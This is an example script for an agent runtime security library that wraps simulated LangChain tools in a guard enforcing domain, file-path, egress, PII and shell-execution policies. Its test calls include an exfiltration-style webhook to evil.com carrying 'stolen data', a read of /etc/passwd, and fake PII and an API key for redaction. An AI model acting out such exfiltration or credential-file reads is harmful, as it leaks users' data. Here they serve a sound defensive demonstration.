"""Example: Applying Guard policies to a LangChain agent.

Usage:
  pip install agent-runtime-security[langchain]
  python examples/langchain_agent.py

This example demonstrates Guard behavior without an LLM.
"""
from langchain_core.tools import tool

from asr import Guard, AuditLogger
from asr.adapters.langchain import guard_tool


@tool
def post_webhook(url: str, body: str) -> str:
  """Send data to an external system."""
  return f"Webhook sent: url={url}, body_length={len(body)}"


@tool
def read_file(path: str) -> str:
  """Read file contents."""
  return f"File contents (simulated): path={path}"


@tool
def search(query: str) -> str:
  """Search internal systems."""
  return f"Results: admin@company.com, phone: 010-1234-5678, key: sk-secret123"


guard = Guard(
  mode="enforce",
  domain_allowlist=["api.internal.com"],
  block_egress=True,
  file_path_allowlist=["/tmp/safe"],
  pii_action="redact",
  capability_policy={"shell_exec": "block"},
)

audit = AuditLogger(output="stdout")

protected_webhook = guard_tool(
  post_webhook, guard=guard, audit=audit, capabilities=["network_send"]
)
protected_file = guard_tool(read_file, guard=guard, audit=audit)
protected_search = guard_tool(search, guard=guard, audit=audit)


if __name__ == "__main__":
  print("=== LangChain + Agent Runtime Security Guard ===\n")

  print("[1] Internal domain webhook (allow)")
  result = protected_webhook.invoke({
    "url": "https://api.internal.com/hook", "body": "hello",
  })
  print(f"  Result: {result}\n")

  print("[2] External domain webhook (block)")
  result = protected_webhook.invoke({
    "url": "https://evil.com/exfil", "body": "stolen data",
  })
  print(f"  Result: {result}\n")

  print("[3] Restricted file path (block)")
  result = protected_file.invoke({"path": "/etc/passwd"})
  print(f"  Result: {result}\n")

  print("[4] Safe file path (allow)")
  result = protected_file.invoke({"path": "/tmp/safe/data.txt"})
  print(f"  Result: {result}\n")

  print("[5] Search result PII redaction")
  result = protected_search.invoke({"query": "admin"})
  print(f"  Result: {result}\n")
